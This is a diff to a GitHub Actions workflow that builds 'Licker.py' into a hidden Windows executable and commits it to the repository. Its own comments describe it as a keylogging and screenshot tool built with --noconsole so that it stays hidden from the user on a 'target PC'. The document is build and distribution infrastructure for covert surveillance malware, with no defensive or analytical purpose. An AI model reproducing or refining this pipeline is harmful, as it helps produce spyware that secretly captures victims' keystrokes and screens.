@@ -25,24 +25,20 @@ jobs:
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
-        # These are essential for your Licker.py code
+        # Essential libraries for keylogging and screenshots
         pip install pyinstaller keyboard pyscreenshot Pillow
 
     - name: Build Executable
-      # --noconsole prevents a black window from popping up on the target PC
+      # --noconsole keeps the process hidden from the user
       run: pyinstaller --onefile --noconsole Licker.py
 
     - name: Sync EXE to Repo
-      shell: cmd
+      # Moving the EXE from the dist folder to the root before pushing
       run: |
+        copy dist\Licker.exe Licker.exe
         git config --global user.name "github-actions[bot]"
         git config --global user.email "github-actions[bot]@users.noreply.github.com"
-        if exist dist\Licker.exe (
-            copy /Y dist\Licker.exe .
-            git add Licker.exe
-            git commit -m "Auto-build: Update Licker.exe" || exit 0
-            git push
-        ) else (
-            echo EXE was not found in dist folder
-            exit 1
-        )
+        git pull origin main --rebase
+        git add Licker.exe
+        git commit -m "Auto-build: Update Licker.exe" || exit 0
+        git push origin main
